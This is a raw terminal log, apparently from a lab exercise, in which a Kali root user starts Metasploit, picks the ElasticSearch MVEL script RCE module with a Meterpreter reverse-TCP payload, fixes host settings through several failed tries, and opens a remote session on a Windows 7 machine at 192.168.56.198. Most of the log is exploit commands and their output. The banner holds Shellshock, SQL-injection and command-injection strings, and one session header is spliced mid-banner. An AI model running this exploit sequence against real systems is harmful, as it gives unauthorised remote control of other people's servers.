@@ -1,0 +1,1146 @@
+Script started on 2023-05-04 18:11:35-04:00 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="166" LINES="34"]
+                                                                                                                                                                      ]0;root@kali: /home/kali/Desktop/final[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali/Desktop/final[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4mu[24m[4mu[24m[38;2;153;153;153mpdate -rc.d postgresql enable[39m[29D[4mu[39m[4ms[24m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [28D[4mu[4ms[4me[24m [4mu[4ms[24m[24m [4mu[24m[24m [4mu[24m[38;2;153;153;153mpdate -rc.d postgresql enable[39m[29D[4mu[39m[4mm[24m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [28D[4mu[4mm[4ms[24m[4ms[4mf[24m[4mf[4mc[24m[4mc[4mo[24m[4mo[4mn[24m[4mo[24m[24m [4mc[24m[24m [4mf[24m[24m [4ms[24m[24m [4mu[4mm[24m[24m [4mu[24m[24m [4mu[24m[38;2;153;153;153mpdate -rc.d postgresql enable[39m[29D[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [30D[4mm[24m[4mm[24m[38;2;153;153;153msfconsole[39m[9D[4mm[39m[4ms[24m[4mm[4ms[39m[4mf[24m[4mf[39m[4mc[24m[4mc[39m[4mo[24m[4mo[39m[4mn[24m[4mn[39m[4ms[24m[24m[36mm[24m[36ms[24m[36mf[24m[36mc[24m[36mo[24m[36mn[24m[36ms[36mo[36ml[36me[39m[?1l>[?2004l
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\                                                  
+[0m[36m[0m
+ ______________________________________________________________________________
+|                                                                              |
+|                          [1m3Kom SuperHack II Logon[0m                             |
+|______________________________________________________________________________|
+|                                                                 Script started on 2023-05-04 18:43:13-04:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="166" LINES="34"]
+                                                                                                                                                                      ]0;root@kali: /home/kali/Desktop/final[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali/Desktop/final[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4mm[24m[4mm[24m[38;2;153;153;153msfconsole[39m[9D[4mm[39m[4ms[24m[4mm[4ms[39m[4mf[24m[4mf[39m[4mc[24m[4mc[39m[4mo[24m[4mo[39m[4mn[24m[4mn[39m[4ms[24m[4ms[39m[4mo[24m[4mo[39m[4ml[24m[9D[24m[36mm[24m[36ms[24m[36mf[24m[36mc[24m[36mo[24m[36mn[24m[36ms[24m[36mo[24m[36ml[36me[39m[?1l>[?2004l
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../                                                  
+[0m[36m[0m
+*Neutrino_Cannon*PrettyBeefy*PostalTime*binbash*deadastronauts*EvilBunnyWrote*L1T*Mail.ru*() { :;}; echo vulnerable*
+*Team sorceror*ADACTF*BisonSquad*socialdistancing*LeukeTeamNaam*OWASP Moncton*Alegori*exit*Vampire Bunnies*APT593*
+*QuePasaZombiesAndFriends*NetSecBG*coincoin*ShroomZ*Slow Coders*Scavenger Security*Bruh*NoTeamName*Terminal Cult*
+*edspiner*BFG*MagentaHats*0x01DA*Kaczuszki*AlphaPwners*FILAHA*Raffaela*HackSurYvette*outout*HackSouth*Corax*yeeb0iz*
+*SKUA*Cyber COBRA*flaghunters*0xCD*AI Generated*CSEC*p3nnm3d*IFS*CTF_Circle*InnotecLabs*baadf00d*BitSwitchers*0xnoobs*
+*ItPwns - Intergalactic Team of PWNers*PCCsquared*fr334aks*runCMD*0x194*Kapital Krakens*ReadyPlayer1337*Team 443*
+*H4CKSN0W*InfOUsec*CTF Community*DCZia*NiceWay*0xBlueSky*ME3*Tipi'Hack*Porg Pwn Platoon*Hackerty*hackstreetboys*
+*ideaengine007*eggcellent*H4x*cw167*localhorst*Original Cyan Lonkero*Sad_Pandas*FalseFlag*OurHeartBleedsOrange*SBWASP*
+*Cult of the Dead Turkey*doesthismatter*crayontheft*Cyber Mausoleum*scripterz*VetSec*norbot*Delta Squad Zero*Mukesh*
+*x00-x00*BlackCat*ARESx*cxp*vaporsec*purplehax*RedTeam@MTU*UsalamaTeam*vitamink*RISC*forkbomb444*hownowbrowncow*
+*etherknot*cheesebaguette*downgrade*FR!3ND5*badfirmware*Cut3Dr4g0n*dc615*nora*Polaris One*team*hail hydra*Takoyaki*
+*Sudo Society*incognito-flash*TheScientists*Tea Party*Reapers of Pwnage*OldBoys*M0ul3Fr1t1B13r3*bearswithsaws*DC540*
+*iMosuke*Infosec_zitro*CrackTheFlag*TheConquerors*Asur*4fun*Rogue-CTF*Cyber*TMHC*The_Pirhacks*btwIuseArch*MadDawgs*
+*HInc*The Pighty Mangolins*CCSF_RamSec*x4n0n*x0rc3r3rs*emehacr*Ph4n70m_R34p3r*humziq*Preeminence*UMGC*ByteBrigade*
+*TeamFastMark*Towson-Cyberkatz*meow*xrzhev*PA Hackers*Kuolema*Nakateam*L0g!c B0mb*NOVA-InfoSec*teamstyle*Panic*
+*B0NG0R3*                                                                                    *Les Cadets Rouges*buf*
+*Les Tontons Fl4gueurs*                                                                      *404 : Flag Not Found*
+*' UNION SELECT 'password*  [1m[31m    _________                __                         [0m         *OCD247*Sparkle Pony* 
+*burner_herz0g*             [1m[31m    \_   ___ \_____  _______/  |_ __ _________   ____   [0m         *Kill$hot*ConEmu*
+*here_there_be_trolls*      [1m[31m    /    \  \/\__  \ \____ \   __\  |  \_  __ \_/ __ \  [0m         *;echo"hacked"*
+*r4t5_*6rung4nd4*NYUSEC*    [1m[31m    \     \____/ __ \|  |_> >  | |  |  /|  | \/\  ___/  [0m         *karamel4e*
+*IkastenIO*TWC*balkansec*   [1m[31m     \______  (____  /   __/|__| |____/ |__|    \___  > [0m         *cybersecurity.li*
+*TofuEelRoll*Trash Pandas*  [1m[31m            \/     \/|__|                           \/  [0m         *OneManArmy*cyb3r_w1z4rd5*
+*Astra*Got Schwartz?*tmux*  [1m[31m                ___________.__                          [0m         *AreYouStuck*Mr.Robot.0*
+*\nls*Juicy white peach*    [1m[31m                \__    ___/|  |__   ____                [0m         *EPITA Rennes*
+*HackerKnights*             [1m[31m                  |    |   |  |  \_/ __ \               [0m         *guildOfGengar*Titans*
+*Pentest Rangers*           [1m[31m                  |    |   |   Y  \  ___/               [0m         *The Libbyrators*
+*placeholder name*bitup*    [1m[31m                  |____|   |___|  /\___  >              [0m         *JeffTadashi*Mikeal*
+*UCASers*onotch*            [1m[31m                                \/     \/               [0m         *ky_dong_day_song*
+*NeNiNuMmOk*                [1m[31m              ___________.__                            [0m         *JustForFun!*
+*Maux de tête*LalaNG*       [1m[31m              \_   _____/|  | _____     ____            [0m         *g3tsh3Lls0on*
+*crr0tz*z3r0p0rn*clueless*  [1m[31m               |    __)  |  | \__  \   / ___\           [0m         *Phở Đặc Biệt*Paradox*
+*HackWara*                  [1m[31m               |     \   |  |__/ __ \_/ /_/  >          [0m         *KaRIPux*inf0sec*
+*Kugelschreibertester*      [1m[31m               \___  /   |____(____  /\___  /           [0m         *bluehens*Antoine77*
+*icemasters*                [1m[31m                   \/              \//_____/            [0m         *genxy*TRADE_NAMES*
+*Spartan's Ravens*          [1m[31m             _______________   _______________          [0m         *BadByte*fontwang_tw*
+*g0ldd1gg3rs*pappo*         [1m[31m            \_____  \   _  \  \_____  \   _  \          [0m         *ghoti*
+*Les CRACKS*c0dingRabbits*  [1m[31m             /  ____/  /_\  \  /  ____/  /_\  \         [0m         *LinuxRiders*   
+*2Cr4Sh*RecycleBin*         [1m[31m            /       \  \_/   \/       \  \_/   \        [0m         *Jalan Durian*
+*ExploitStudio*             [1m[31m            \_______ \_____  /\_______ \_____  /        [0m         *WPICSC*logaritm*
+*Car RamRod*0x41414141*     [1m[31m                    \/     \/         \/     \/         [0m         *Orv1ll3*team-fm4dd*
+*Björkson*FlyingCircus*                                                                      *PwnHub*H4X0R*Yanee*
+*Securifera*hot cocoa*                                                                       *Et3rnal*PelarianCP*
+*n00bytes*DNC&G*guildzero*dorko*tv*42*{EHF}*CarpeDien*Flamin-Go*BarryWhite*XUcyber*FernetInjection*DCcurity*
+*Mars Explorer*ozen_cfw*Fat Boys*Simpatico*nzdjb*Isec-U.O*The Pomorians*T35H*H@wk33*JetJ*OrangeStar*Team Corgi*
+*D0g3*0itch*OffRes*LegionOfRinf*UniWA*wgucoo*Pr0ph3t*L0ner*_n00bz*OSINT Punchers*Tinfoil Hats*Hava*Team Neu*
+*Cyb3rDoctor*Techlock Inc*kinakomochi*DubbelDopper*bubbasnmp*w*Gh0st$*tyl3rsec*LUCKY_CLOVERS*ev4d3rx10-team*ir4n6*
+*PEQUI_ctf*HKLBGD*L3o*5 bits short of a byte*UCM*ByteForc3*Death_Geass*Stryk3r*WooT*Raise The Black*CTErr0r*
+*Individual*mikejam*Flag Predator*klandes*_no_Skids*SQ.*CyberOWL*Ironhearts*Kizzle*gauti*
+*San Antonio College Cyber Rangers*sam.ninja*Akerbeltz*cheeseroyale*Ephyra*sard city*OrderingChaos*Pickle_Ricks*
+*Hex2Text*defiant*hefter*Flaggermeister*Oxford Brookes University*OD1E*noob_noob*Ferris Wheel*Ficus*ONO*jameless*
+*Log1c_b0mb*dr4k0t4*0th3rs*dcua*cccchhhh6819*Manzara's Magpies*pwn4lyfe*Droogy*Shrubhound Gang*ssociety*HackJWU*
+*asdfghjkl*n00bi3*i-cube warriors*WhateverThrone*Salvat0re*Chadsec*0x1337deadbeef*StarchThingIDK*Tieto_alaviiva_turva*
+*InspiV*RPCA Cyber Club*kurage0verfl0w*lammm*pelicans_for_freedom*switchteam*tim*departedcomputerchairs*cool_runnings*
+*chads*SecureShell*EetIetsHekken*CyberSquad*P&K*Trident*RedSeer*SOMA*EVM*BUckys_Angels*OrangeJuice*DemDirtyUserz*
+*OpenToAll*Born2Hack*Bigglesworth*NIS*10Monkeys1Keyboard*TNGCrew*Cla55N0tF0und*exploits33kr*root_rulzz*InfosecIITG*
+*superusers*H@rdT0R3m3b3r*operators*NULL*stuxCTF*mHackresciallo*Eclipse*Gingabeast*Hamad*Immortals*arasan*MouseTrap*
+*damn_sadboi*tadaaa*null2root*HowestCSP*fezfezf*LordVader*Fl@g_Hunt3rs*bluenet*P@Ge2mE*
+
+[0m
+
+       =[ [33mmetasploit v6.3.4-dev[0m                           ]
++ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
++ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Adapter names can be used for IP params 
+[32mset LHOST eth0[0m
+Metasploit Documentation: https://docs.metasploit.com/
+
+[?1034h[4mmsf6[0m [0m> woel[K[Kk[Krkspace kackit[K[K[K[K[K[Khackit
+[0m[1m[31m[-][0m Database not connected
+[4mmsf6[0m [0m> 
+zsh: suspended  msfconsole
+                                                                                                                                                                      ]0;root@kali: /home/kali/Desktop/final
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali/Desktop/final[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4ms[24m[4ms[24m[38;2;153;153;153mervice postgresql start[39m[23D[4ms[39m[4me[24m[4ms[4me[39m[4mr[24m[4mr[39m[4mv[24m[4mv[39m[4mi[24m[4mi[39m[4mc[24m[24m[36ms[24m[36me[24m[36mr[24m[36mv[24m[36mi[24m[36mc[36me[39m[39m [39mp[39mo[39ms[39mt[39mg[39mr[39me[39ms[39mq[39ml[39m [39ms[39mt[39ma[39mr[39mt[?1l>[?2004l
+                                                                                                                                                                      ]0;root@kali: /home/kali/Desktop/final
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali/Desktop/final[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4mm[24m[4mm[24m[38;2;153;153;153msfconsole[39m[9D[4mm[39m[4ms[24m[4mm[4ms[39m[4mf[24m[4mf[39m[4mc[24m[4mc[39m[4mo[24m[4mo[39m[4mn[24m[4mn[39m[4ms[24m[4ms[39m[4me[24m[39m [39m [4ms[24m[24m [38;2;153;153;153mole[39m[4mn[24m[24m [39m [39m [39m [38;2;153;153;153msole[39m[4mo[24m[24m [39m [39m [39m [39m [38;2;153;153;153mnsole[39m[4mc[24m[24m [39m [39m [39m [39m [39m [38;2;153;153;153monsole[39m[4mf[24m[24m [39m [39m [39m [39m [39m [39m [38;2;153;153;153mconsole[39m[4mm[4ms[24m[24m [39m [39m [39m [39m [39m [39m [39m [8D[38;2;153;153;153mfconsole[39m[8D[4mm[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [9D[4mm[24m[38;2;153;153;153msfconsole[39m[9D[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [10D[4ms[24m[4ms[24m[38;2;153;153;153mervice postgresql start[39m[23D[4ms[39m[4me[24m[4ms[4me[39m[4mr[24m[4mr[39m[4mv[24m[4mv[39m[4mi[24m[4mi[39m[4mc[24m[24m[36ms[24m[36me[24m[36mr[24m[36mv[24m[36mi[24m[36mc[36me[39m[39m [32m-[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [15D[32m-[32m-[39m[32m-[32ms[39m[32ms[32mt[39m[32mt[32matus-all[39m[1m [0m[0m [?1l>[?2004l
+ [ - ]  apache-htcacheclean
+ [ - ]  apache2
+ [ - ]  apparmor
+ [ - ]  atftpd
+ [ - ]  bluetooth
+ [ - ]  console-setup.sh
+ [ + ]  cron
+ [ - ]  cryptdisks
+ [ - ]  cryptdisks-early
+ [ + ]  dbus
+ [ - ]  dns2tcp
+ [ - ]  exim4
+ [ + ]  haveged
+ [ - ]  hwclock.sh
+ [ - ]  inetsim
+ [ - ]  iodined
+ [ - ]  ipsec
+ [ - ]  keyboard-setup.sh
+ [ + ]  kmod
+ [ + ]  lightdm
+ [ - ]  lm-sensors
+ [ - ]  mariadb
+ [ - ]  miredo
+ [ - ]  mosquitto
+ [ + ]  networking
+ [ - ]  nfs-common
+ [ - ]  nginx
+ [ - ]  nmbd
+ [ - ]  ntpsec
+ [ - ]  openvpn
+ [ - ]  pcscd
+ [ - ]  plymouth
+ [ + ]  plymouth-log
+ [ + ]  postgresql
+ [ + ]  procps
+ [ - ]  ptunnel
+ [ - ]  pulseaudio-enable-autospawn
+ [ - ]  redis-server
+ [ - ]  redsocks
+ [ - ]  rpcbind
+ [ - ]  rsync
+ [ - ]  rwhod
+ [ - ]  samba-ad-dc
+ [ - ]  saned
+ [ - ]  screen-cleanup
+ [ - ]  smartmontools
+ [ - ]  smbd
+ [ - ]  snmpd
+ [ - ]  speech-dispatcher
+ [ - ]  ssh
+ [ - ]  sslh
+ [ - ]  stunnel4
+ [ - ]  sudo
+ [ - ]  sysstat
+ [ + ]  udev
+ [ + ]  virtualbox-guest-utils
+ [ - ]  x11-common
+ [ - ]  xl2tpd
+                                                                                                                                                                      ]0;root@kali: /home/kali/Desktop/final
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali/Desktop/final[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4mm[24m[4mm[24m[38;2;153;153;153msfconsole[39m[9D[4mm[39m[4ms[24m[4mm[4ms[39m[4mf[24m[4mf[39m[4mc[24m[4mc[39m[4mo[24m[4mo[39m[4mn[24m[4mn[39m[4ms[24m[4ms[39m[4ml[24m[39m [39m [4ml[4me[24m[4ml[24m[24m [4ms[24m[24m [38;2;153;153;153mole[39m[24m[36mm[24m[36ms[24m[36mf[24m[36mc[24m[36mo[24m[36mn[24m[36ms[36mo[36ml[36me[39m[?1l>[?2004l
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|                                                  
+[0m[36m[0m[31m               .;lxO0KXXXK0Oxl:.
+           ,o0WMMMMMMMMMMMMMMMMMMKd,
+        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
+      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
+    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
+   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
+  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
+ oMMMMMMMMMMx.                    dMMMMMMMMMMx
+.WMMMMMMMMM:                       :MMMMMMMMMM,
+xMMMMMMMMMo                         lMMMMMMMMMO
+NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
+MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
+NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
+xMMMMMMMMMd                        ,0MMMMMMMMMMK;
+.WMMMMMMMMMc                         'OMMMMMM0,
+ lMMMMMMMMMMk.                         .kMMO'
+  dMMMMMMMMMMWd'                         ..
+   cWMMMMMMMMMMMNxc'.[0m[37m                ##########[0m
+[31m    .0MMMMMMMMMMMMMMMMWc[0m[37m            #+#    #+#[0m
+[31m      ;0MMMMMMMMMMMMMMMo.[0m[37m          +:+[0m
+[31m        .dNMMMMMMMMMMMMo[0m          +[37m#+[0m+:++#+
+[31m           'oOWMMMMMMMMo[0m                +:+
+[31m               .,cdkO0K;[0m        :+:    :+:                                
+                                :::::::+:
+                      [37mMetasploit[0m[0m
+
+       =[ [33mmetasploit v6.3.4-dev[0m                           ]
++ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
++ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: To save all commands executed since start up 
+to a file, use the [32mmakerc[0m command
+Metasploit Documentation: https://docs.metasploit.com/
+
+[?1034h[4mmsf6[0m [0m> runset lport 4444host 192.168.56.103[C[C[C[C[C[C[C[C[C[Cg Rhosts 192.168.56.105[C[C[C[C[C[C[C[C[C[C[P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Coptions[Kset Rhosts 192.168.56.105[C[C[C[C[C[C[C[C[C[Cg Rhosts 192.168.56.105[C[C[C[C[C[C[C[C[C[C[P[P lhost 192.168.56.103[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[Pport 4444[C[C[C[C[C[C[Crun[K[Ko[Kworkspace hackit
+[0m[1m[34m[*][0m Workspace: hackit
+[4mmsf6[0m [0m> hosts
+[0m
+Hosts
+=====
+
+address         mac                name     os_name    os_flavor  os_sp  purpose  info  comments
+-------         ---                ----     -------    ---------  -----  -------  ----  --------
+192.168.56.103
+192.168.56.105  08:00:27:7F:BF:2E  IE8Win7  Windows 7                    client
+
+[4mmsf6[0m [0m> search elastic
+[0m
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank       Check  Description
+   -  ----                                              ---------------  ----       -----  -----------
+   0  exploit/multi/[45melastic[0msearch/script_mvel_rce       2013-12-09       [32mexcellent[0m  Yes    [45mElastic[0mSearch Dynamic Script Arbitrary Java Execution
+   1  auxiliary/scanner/[45melastic[0msearch/indices_enum                       normal     No     [45mElastic[0mSearch Indices Enumeration Utility
+   2  exploit/multi/[45melastic[0msearch/search_groovy_script  2015-02-11       [32mexcellent[0m  Yes    [45mElastic[0mSearch Search Groovy Sandbox Bypass
+   3  auxiliary/scanner/http/[45melastic[0msearch_traversal                     normal     Yes    [45mElastic[0mSearch Snapshot API Directory Traversal
+   4  exploit/multi/misc/xdh_x_exec                     2015-12-04       [32mexcellent[0m  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
+
+
+Interact with a module by name or index. For example [32minfo 4[0m, [32muse 4[0m or [32muse exploit/multi/misc/xdh_x_exec[0m
+
+[4mmsf6[0m [0m> use 0
+[0m[1m[34m[*][0m No payload configured, defaulting to java/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> options
+[0m
+Module options (exploit/multi/elasticsearch/script_mvel_rce):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT        9200             yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI    /                yes       The path to the ElasticSearch REST API
+   VHOST                         no        HTTP server virtual host
+   WritableDir  /tmp             yes       A directory where we can write files (only for *nix environments)
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   ElasticSearch 1.1.1 / Automatic
+
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> set LhOST 192.168.56.103
+[0mLhOST => 192.168.56.103
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> set Rhost 192.168.56.105
+[0mRhost => 192.168.56.105
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> set Rhost 192.168.56.105[Cg Rhost 192.168.56.105[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+[0mRhost => 192.168.56.105
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 192.168.56.103:4444 
+[1m[34m[*][0m Trying to execute arbitrary Java...
+[1m[31m[-][0m Exploit aborted due to failure: unknown: 192.168.56.105:9200 - Java has not been executed, aborting...
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> options
+[0m
+Module options (exploit/multi/elasticsearch/script_mvel_rce):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS       192.168.56.105   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT        9200             yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI    /                yes       The path to the ElasticSearch REST API
+   VHOST                         no        HTTP server virtual host
+   WritableDir  /tmp             yes       A directory where we can write files (only for *nix environments)
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.56.103   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   ElasticSearch 1.1.1 / Automatic
+
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> options[P[P[P[Prunsetg Rhost 192.168.56.105[P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K3
+[0mRhost => 192.168.56.103
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> set Rhost 192.168.56.103options[K[P[P[P[Prunsetg Rhost 192.168.56.105[K3
+[0mRhost => 192.168.56.103
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> setg Rhost 192.168.56.103[P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Coptions[K[P[P[P[Prunsetg Rhost 192.168.56.105[P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[CLhOST 192.168.56.103[K5
+[0mLhOST => 192.168.56.105
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> run
+[0m
+[1m[31m[-][0m Handler failed to bind to 192.168.56.105:4444:-  -
+[1m[34m[*][0m Started reverse TCP handler on 0.0.0.0:4444 
+[1m[34m[*][0m Trying to execute arbitrary Java...
+[1m[31m[-][0m Exploit aborted due to failure: unknown: 192.168.56.103:9200 - Java has not been executed, aborting...
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> runset LhOST 192.168.56.105g Rhost 192.168.56.103[P LhOST 192.168.56.105[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Ksetg Rhost 192.168.56.103[P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Coptions[K[P[P[P[Prunsetg Rhost 192.168.56.105[P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[CLhOST 192.168.56.103[K3
+[0mLhOST => 192.168.56.103
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> set LhOST 192.168.56.103run[K[Ksetg Rhost 192.168.56.103[P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[K98
+[0mRhost => 192.168.56.198
+[4mmsf6[0m exploit([1m[31mmulti/elasticsearch/script_mvel_rce[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 192.168.56.103:4444 
+[1m[34m[*][0m Trying to execute arbitrary Java...
+[1m[34m[*][0m Discovering remote OS...
+[1m[32m[+][0m Remote OS is 'Windows 7'
+[1m[34m[*][0m Discovering TEMP path
+[1m[32m[+][0m TEMP path identified: 'C:\Windows\TEMP\'
+[1m[34m[*][0m Sending stage (58829 bytes) to 192.168.56.198
+[0m[1m[34m[*][0m Meterpreter session 1 opened (192.168.56.103:4444 -> 192.168.56.198:49318) at 2023-05-04 18:51:28 -0400
+[1m[33m[!][0m This exploit may require manual cleanup of 'C:\Windows\TEMP\qvZdQ.jar' on the target
+
